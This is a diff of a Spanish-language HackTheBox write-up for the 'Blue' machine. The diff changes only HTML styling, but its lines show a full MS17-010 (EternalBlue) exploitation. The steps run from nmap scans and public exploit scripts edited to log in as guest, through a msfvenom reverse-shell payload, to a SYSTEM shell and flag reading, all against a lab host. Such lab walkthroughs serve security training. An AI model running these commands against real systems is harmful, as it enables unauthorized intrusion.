@@ -1,14 +1,14 @@
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/blue/02-tarjeta.png" />
 </p>
 
 <p>¡Hola!
-En esta ocasión vamos a resolver de la maquina <code class="highlighter-rouge">Blue</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
+En esta ocasión vamos a resolver de la maquina <code class="language-plaintext highlighter-rouge">Blue</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
 La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
 
 <h2 id="preparación">PREPARACIÓN</h2>
 
-<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="highlighter-rouge">blue</code> y los subdirectorios <code class="highlighter-rouge">recon</code> junto con <code class="highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">blue</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack blue
 <span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
@@ -16,7 +16,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 
 <h2 id="reconocimiento">RECONOCIMIENTO</h2>
 
-<p>Accedemos al directorio <code class="highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
+<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  osping 10.10.10.40
   
@@ -41,7 +41,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   49155/tcp open  unknown
 </code></pre></div></div>
 
-<p>Luego de identificar los puertos abiertos <code class="highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  nmap <span class="nt">-p135</span>,139,445,49155 <span class="nt">-sCV</span> 10.10.10.40 <span class="nt">-oN</span> versions
   PORT      STATE SERVICE      VERSION
@@ -75,7 +75,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 
 <h2 id="reconocimiento-smb">RECONOCIMIENTO SMB</h2>
 
-<p>Iniciamos con el reconocimiento del servicio <code class="highlighter-rouge">smb</code> donde inicialmente ejecutamos todos los scripts potencialmente vulnerables soportados por nmap, en búsqueda de posibles CVEs vulnerables en la máquina.</p>
+<p>Iniciamos con el reconocimiento del servicio <code class="language-plaintext highlighter-rouge">smb</code> donde inicialmente ejecutamos todos los scripts potencialmente vulnerables soportados por nmap, en búsqueda de posibles CVEs vulnerables en la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  nmap <span class="nt">-p445</span> 10.10.10.40 <span class="nt">--script</span> <span class="s2">"smb-vuln*"</span>
   PORT    STATE SERVICE
@@ -100,7 +100,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
 </code></pre></div></div>
 
-<p>¡Encontramos un CVE que presenta vulnerabilidades en la máquina! <code class="highlighter-rouge">ms17-010</code>.</p>
+<p>¡Encontramos un CVE que presenta vulnerabilidades en la máquina! <code class="language-plaintext highlighter-rouge">ms17-010</code>.</p>
 
 <h2 id="explotacion-por-ms17-010">EXPLOTACION POR MS17-010</h2>
 <p>Vamos a realizar la explotación de nuestro primer CVE, para este caso haremos uso del script de github de <a href="https://github.com/helviojunior/MS17-010">helviojunior</a> <em>para esta explotación es necesario tener instalado python2</em>.</p>
@@ -120,7 +120,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  pip <span class="nb">install </span>impacket
 </code></pre></div></div>
 
-<p>Como primer paso, vamos a ejecutar el <code class="highlighter-rouge">checker.py</code> que nos ayuda a identificar el nombre del pipe que vamos a utilizar en el script de explotación.</p>
+<p>Como primer paso, vamos a ejecutar el <code class="language-plaintext highlighter-rouge">checker.py</code> que nos ayuda a identificar el nombre del pipe que vamos a utilizar en el script de explotación.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python checker.py 10.10.10.40
 Trying to connect to 10.10.10.40:445
@@ -135,14 +135,14 @@ lsarpc: STATUS_ACCESS_DENIED
 browser: STATUS_ACCESS_DENIED
 </code></pre></div></div>
 
-<p>En esta oportunidad no hemos tenido éxito encontrando un nombre de pipe que podamos utilizar para nuestra explotación, por lo que procedemos a modificar el script <code class="highlighter-rouge">checker.py</code>, agregando el usuario “guest” en el campo de usuario.</p>
+<p>En esta oportunidad no hemos tenido éxito encontrando un nombre de pipe que podamos utilizar para nuestra explotación, por lo que procedemos a modificar el script <code class="language-plaintext highlighter-rouge">checker.py</code>, agregando el usuario “guest” en el campo de usuario.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim checker.py
 <span class="k">**</span>AGREGAR guest EN LA LINEA 14
   USERNAME <span class="o">=</span> <span class="s1">'guest'</span>
 </code></pre></div></div>
 
-<p>Intentamos nuevamente realizar la ejecución del script <code class="highlighter-rouge">checker.py</code></p>
+<p>Intentamos nuevamente realizar la ejecución del script <code class="language-plaintext highlighter-rouge">checker.py</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python checker.py 10.10.10.40
 Trying to connect to 10.10.10.40:445
@@ -156,21 +156,21 @@ netlogon: Ok <span class="o">(</span>Bind context 1 rejected: provider_rejection
 lsarpc: Ok (64 bit)
 browser: Ok (64 bit)
 </span></code></pre></div></div>
-<p>Tal como podemos ver, los nombres de pipe que podemos utilizar son los de status <strong>OK</strong>, en este caso <code class="highlighter-rouge">samr</code>, <code class="highlighter-rouge">netlogon</code>, <code class="highlighter-rouge">lsarpc</code> y <code class="highlighter-rouge">browser</code>.</p>
+<p>Tal como podemos ver, los nombres de pipe que podemos utilizar son los de status <strong>OK</strong>, en este caso <code class="language-plaintext highlighter-rouge">samr</code>, <code class="language-plaintext highlighter-rouge">netlogon</code>, <code class="language-plaintext highlighter-rouge">lsarpc</code> y <code class="language-plaintext highlighter-rouge">browser</code>.</p>
 
-<p>Para poder tener éxito, es necesario generar una reverse shell por medio de la utilidad <code class="highlighter-rouge">msfvenom</code> con nuestra dirección IP y puerto de escucha para obtener posteriormente la shell denominada <code class="highlighter-rouge">reverseShell.exe</code></p>
+<p>Para poder tener éxito, es necesario generar una reverse shell por medio de la utilidad <code class="language-plaintext highlighter-rouge">msfvenom</code> con nuestra dirección IP y puerto de escucha para obtener posteriormente la shell denominada <code class="language-plaintext highlighter-rouge">reverseShell.exe</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.11 <span class="nv">LPORT</span><span class="o">=</span>4564 <span class="nt">-f</span> exe <span class="nt">-o</span> reverseShell.exe
 </code></pre></div></div>
 
-<p>Para que el script de explotación funcione de manera correcta, debemos repetir el proceso que realizamos con <code class="highlighter-rouge">checker.py</code>, pero esta vez la modificación se realiza en el script <code class="highlighter-rouge">send_and_execute.py</code>.</p>
+<p>Para que el script de explotación funcione de manera correcta, debemos repetir el proceso que realizamos con <code class="language-plaintext highlighter-rouge">checker.py</code>, pero esta vez la modificación se realiza en el script <code class="language-plaintext highlighter-rouge">send_and_execute.py</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim send_and_execute.py
 <span class="k">**</span>AGREGAR guest EN LA LINEA 37
     USERNAME <span class="o">=</span> <span class="s1">'guest'</span>
 </code></pre></div></div>
 
-<p>Ahora que tenemos el pipe, la reverse shell generada y el script modificado, procedemos a ejecutar el script de explotación <code class="highlighter-rouge">send_and_execute.py</code> para cargar y ejecutar el payload.</p>
+<p>Ahora que tenemos el pipe, la reverse shell generada y el script modificado, procedemos a ejecutar el script de explotación <code class="language-plaintext highlighter-rouge">send_and_execute.py</code> para cargar y ejecutar el payload.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python send_and_execute.py 10.10.10.40 reverseShell.exe 445 samr
 Trying to connect to 10.10.10.40:445
@@ -213,7 +213,7 @@ nca_s_proto_error
 Done
 </code></pre></div></div>
 
-<p>Generamos un listener por el puerto escogido y obtenemos acceso al sistema como usuario <code class="highlighter-rouge">NT Authority/System</code></p>
+<p>Generamos un listener por el puerto escogido y obtenemos acceso al sistema como usuario <code class="language-plaintext highlighter-rouge">NT Authority/System</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-lvnp</span> 4564
 listening on <span class="o">[</span>any] 4564 ...
@@ -232,7 +232,7 @@ whoami
 
 <h2 id="flags">FLAGS</h2>
 
-<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
+<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="language-plaintext highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\</span>
 <span class="nb">dir</span> /b/s user.txt
@@ -249,9 +249,9 @@ echo.%root:~0,10%
 3237c9c2dc
 </code></pre></div></div>
 
-<p>¡Hemos logrado completar la máquina <code class="highlighter-rouge">Blue</code> de HackTheBox!</p>
+<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">Blue</code> de HackTheBox!</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/blue/03-finish.png" />
 </p>
 
